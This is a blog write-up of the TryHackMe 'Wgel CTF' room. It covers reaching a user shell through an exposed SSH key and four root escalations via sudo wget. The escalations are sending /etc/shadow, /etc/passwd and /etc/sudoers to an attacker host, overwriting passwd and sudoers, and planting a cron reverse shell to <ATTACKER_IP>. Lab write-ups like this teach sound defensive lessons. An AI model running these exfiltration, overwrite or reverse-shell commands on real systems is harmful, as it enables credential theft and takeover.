---
layout: post
mermaid: true
title: "Wgel CTF — Alternative Privilege Escalation Vectors"
date: 2026-06-11
categories: [ctf]
tags: [thm, wget, sudo, privesc, linux]
---

## Overview

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **URL** | <a href="https://tryhackme.com/room/wgelctf" target="_blank">https://tryhackme.com/room/wgelctf</a> |
| **Focus** | Alternative privilege escalation vectors via `sudo wget` |

This is a straightforward room. The goal is to get access to the target machine and escalate privileges to full control. No flags are discussed here — the focus is entirely on the techniques.

---

## Reconnaissance

Starting with a port scan:

```bash
nmap -sC -sV -O <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18
```

Two services: SSH on port 22 and a web server on port 80. Navigating to `http://<TARGET_IP>` shows the default Apache page. Nothing interesting at first glance, but the page source reveals this comment:

```html
<!-- Jessie don't forget to udate the webiste -->
```

A typo and a name — `jessie`. Potential username noted.

---

## Enumeration

```bash
gobuster dir -u http://<TARGET_IP> --wordlist /usr/share/wordlists/dirb/common.txt
```

Two results stand out:

```
http://<TARGET_IP>/sitemap/.ssh/
http://<TARGET_IP>/sitemap/.ssh/id_rsa
```

A `.ssh` directory sitting inside the web root, fully indexed and publicly accessible — and inside it, a private RSA key. A single `Options -Indexes` directive in the Apache config would have hidden the directory entirely. Proper file placement outside the web root would have made this attack path impossible.

---

## Initial Access

Download the key and set the right permissions:

```bash
curl http://<TARGET_IP>/sitemap/.ssh/id_rsa -o ~/.ssh/wgel_id_rsa
chmod 600 ~/.ssh/wgel_id_rsa
```

Connect via SSH using the username found in the page source:

```bash
ssh -i ~/.ssh/wgel_id_rsa jessie@<TARGET_IP>
```

We're in as `jessie`.

---

## Privilege Escalation

First thing after getting a shell — check what `jessie` can run as root:

```bash
sudo -l
```

```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

The standard approach most use is reading a privileged file directly, assuming the path is /root/root.txt: 

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<ATTACKER_IP>:4445
```

That works, but it misses the bigger picture. `wget` with root privileges is effectively a read/write primitive over the entire filesystem:

- `--post-file=<path>` sends any file to a listener we control — **arbitrary read**
- `-O <path>` writes downloaded content to any path — **arbitrary write**

Those two capabilities together open up several paths to root. Below are the ones explored in this room.

---

### Vector 1 — `--post-file` exfiltration

This doesn't give a shell, but it lets you read any file root has access to: `/etc/shadow`, SSH keys, configuration files, anything. Useful when the goal is data and not necessarily a shell.

On the attacker, start a listener:

```bash
nc -lvnp 8000 > output_raw
```

On the target, send the file:

```bash
sudo wget --post-file=/etc/shadow http://<ATTACKER_IP>:8000/
```

The data arrives wrapped in HTTP POST headers. Strip them with:

```bash
sed -n '/^root:/,$p' output_raw > output_clean
```

Breaking that down: `sed -n` suppresses default output; `/^root:/,$p` finds the first line starting with `root:` and prints from there to the end of the file. Works for both `/etc/shadow` and `/etc/passwd` since both start with the root entry.

---

### Vector 2 — `/etc/passwd` overwrite

`/etc/passwd` uses an `x` in the second field to delegate authentication to `/etc/shadow`. If that field contains a valid hash instead, the system uses it directly. This means we can inject a new entry with `uid=0` and a password we know, then `su` into it as root.

**Step 1 — Exfiltrate the current `/etc/passwd`**

On the attacker:

```bash
nc -lvnp 8000 > etcpasswd_raw
```

On the target:

```bash
sudo wget --post-file=/etc/passwd http://<ATTACKER_IP>:8000/
```

**Step 2 — Strip the HTTP headers**

```bash
sed -n '/^root:/,$p' etcpasswd_raw > etcpasswd_clean
```

**Step 3 — Generate a password hash**

```bash
openssl passwd -6 hacker123
```

This outputs a SHA-512 hash. Copy the full string for the next step.

**Step 4 — Inject a root user entry**

Use **single quotes** so the shell doesn't expand the `$` characters in the hash:

```bash
echo 'hacker:$6$<HASH_GENERATED>:0:0:root:/root:/bin/bash' >> etcpasswd_clean
```

Fields in order: username, password hash, UID, GID, comment, home directory, shell. UID and GID set to `0` means root.

**Step 5 — Verify before uploading**

A corrupted `/etc/passwd` can lock everyone out of the system. Always check before overwriting:

```bash
tail -5 etcpasswd_clean
```

```
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
jessie:x:1000:1000:jessie,,,:/home/jessie:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
hacker:$6$<HASH_GENERATED>:0:0:root:/root:/bin/bash
```

`jessie` is still there and the new entry is at the bottom with the hash intact.

**Step 6 — Serve and overwrite**

On the attacker:

```bash
python3 -m http.server 8000
```

On the target:

```bash
sudo wget http://<ATTACKER_IP>:8000/etcpasswd_clean -O /etc/passwd
```

The `-O` flag tells `wget` to save the downloaded content to a specific path — overwriting the existing file.

**Step 7 — Switch to root**

```bash
su - hacker
```

```
Password:
root@CorpOne:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### Vector 3 — `/etc/sudoers` overwrite

Same read-modify-write approach, this time targeting `/etc/sudoers`. The goal is to add a `NOPASSWD` entry for `/bin/bash`.

**Step 1 — Exfiltrate the current sudoers file**

On the attacker:

```bash
nc -lvnp 4545
```

On the target:

```bash
sudo /usr/bin/wget --post-file=/etc/sudoers http://<ATTACKER_IP>:4545
```

Save the received content, stripping the HTTP headers, as a local file named `sudoers`.

**Step 2 — Add the new entry**

Append this line to the file:

```
jessie  ALL=(root) NOPASSWD: /bin/bash
```

> A malformed `sudoers` file can break `sudo` entirely. Don't remove any existing lines — just append this one. If in doubt, `visudo -c -f sudoers` validates the syntax before deploying.

**Step 3 — Serve and overwrite**

On the attacker:

```bash
python3 -m http.server 8000
```

On the target:

```bash
sudo /usr/bin/wget http://<ATTACKER_IP>:8000/sudoers -O /etc/sudoers
```

```
/etc/sudoers   100%[============================>]   821  --.-KB/s   in 0s
```

**Step 4 — Get a root shell**

```bash
sudo /bin/bash
```

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

---

### Vector 4 — Cron injection via `/etc/cron.d/`

`wget` can write to `/etc/cron.d/`, the directory where root picks up and runs scheduled jobs. Drop a crafted file there and get a reverse shell as root within 60 seconds.

**Step 1 — Create the malicious cron file**

Working from `/tmp` on the attacker:

```bash
cat > /tmp/pwned_cron << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1

EOF
```

Three things are required for the job to actually run:
- `SHELL=/bin/bash` — without this, the `>&` operator won't be interpreted
- `PATH=...` — without a defined PATH, the system won't find the binaries
- A **blank line at the end** — hard requirement for files in `/etc/cron.d/`

**Step 2 — Verify the file format**

```bash
cat -A /tmp/pwned_cron
```

```
SHELL=/bin/bash$
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin$
* * * * * root bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1$
$
```

Every line ends with `$`, including the final blank one. If it's missing:

```bash
echo >> /tmp/pwned_cron
```

**Step 3 — Start the listener and serve the file**

In one terminal:

```bash
nc -lvnp 4444
```

In another:

```bash
python3 -m http.server 8000
```

**Step 4 — Drop the cron file on the target**

```bash
sudo wget http://<ATTACKER_IP>:8000/pwned_cron -O /etc/cron.d/pwned
```

```
/etc/cron.d/pwned   100%[============================>]   143  --.-KB/s   in 0s
```

Wait up to 60 seconds. When cron fires the job, the listener catches the connection:

```
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 34096
bash: no job control in this shell
root@CorpOne:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Attack Flow


<div class="mermaid">
graph TD
    A["nmap scan"] --> B["Port 80\nApache default page"]
    B --> C["HTML source comment\nusername: jessie"]
    B --> D["gobuster\nweb enumeration"]
    D --> E["Indexed .ssh directory\n/sitemap/.ssh/id rsa"]
    C --> F["SSH access\njessie - private key"]
    E --> F
    F --> G["sudo -l\nNOPASSWD: /usr/bin/wget"]
    G --> V1["Vector 1\n--post-file\narbitrary file read"]
    G --> V2["Vector 2\n/etc/passwd overwrite\nnew uid=0 user"]
    G --> V3["Vector 3\n/etc/sudoers overwrite\nNOPASSWD: /bin/bash"]
    G --> V4["Vector 4\ncron job injection\nreverse shell"]
    V2 --> R["root"]
    V3 --> R
    V4 --> R
</div>

---

## Key Takeaways

`sudo` permissions over tools like `wget`, `curl`, `cp`, or `tee` are far more dangerous than they appear. Read/write access to the filesystem as root is, for all practical purposes, equivalent to having root itself. If you ever see one of these in a `sudo -l` output, check [GTFOBins](https://gtfobins.github.io) — it covers exactly what you can do with each one.

The exposed private key is a good reminder that web server configuration matters as much as application security. Directory listing enabled on a `.ssh` folder inside the web root is the kind of misconfiguration that ends a pentest before it really begins.

